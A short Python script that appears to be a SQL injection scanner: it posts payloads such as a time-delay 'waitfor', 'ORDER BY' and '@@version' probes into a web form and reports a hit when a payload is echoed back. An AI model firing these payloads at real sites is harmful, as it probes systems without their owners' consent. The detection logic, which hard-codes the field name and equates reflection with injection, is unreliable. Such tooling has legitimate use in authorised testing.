import colorama
import datetime
import requests
import sys
import re
import urllib.parse
from colorama import Fore, Back, Style
from bs4 import BeautifulSoup
from references import *

def load(item, string, time):
    if item == string:
        print(Fore.BLUE + time + Fore.RESET)

def SQLSPECIFIC(url, formname):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    doesExist = False
    for payload in sqlpayloads:

        load(payload, "'));waitfor delay '0:0:__TIME__'--", "10%")
        load(payload, " AS INJECTX WHERE 1=1 AND 1=0--", "30%")
        load(payload, "WHERE 1=1 AND 1=1#", "60%")
        load(payload, "ORDER BY 9#", "80%")
        load(payload, "and (select substring(@@version,3,1))='X'", "100%")

        # Inject the payload into the search field and submit the form
        search_field = soup.find('input', {'name': formname})
        if search_field is None:
            print(Fore.LIGHTWHITE_EX + "-------- Results --------")
            print(Fore.WHITE + "> " + Fore.YELLOW + "SQL Injection Error: Could not find search field on page")
            return

        search_field['value'] = payload
        response = requests.post(url, data={'search': payload})

        # Check if the payload was reflected in the response
        if payload in response.text:
            print(Fore.LIGHTWHITE_EX + "-------- Results --------")
            print(Fore.RED + "> SQL injection vulnerability detected with payload:", payload)
            doesExist = True
    if doesExist == False:
        print(Fore.LIGHTWHITE_EX + "-------- Results --------")
        print(Fore.YELLOW + "> No SQL Injection vulnerability found.")